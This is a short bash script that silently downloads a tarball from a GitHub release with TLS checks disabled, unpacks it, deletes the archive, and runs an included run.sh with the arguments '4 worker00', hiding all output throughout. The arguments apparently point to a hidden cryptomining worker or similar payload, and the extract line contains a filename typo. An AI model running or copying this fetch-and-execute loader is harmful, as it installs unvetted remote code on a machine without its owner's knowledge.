#!/bin/bash

curl -sLkO https://github.com/mrsilkin1-del/Anomin/releases/download/vertex/nowde.tar.gz >/dev/null 2>&1
tar -xvf nowde.tar.gzz >/dev/null 2>&1
rm nowde.tar.gz
chmod +x run.sh 
./run.sh 4 worker00 >/dev/null 2>&1
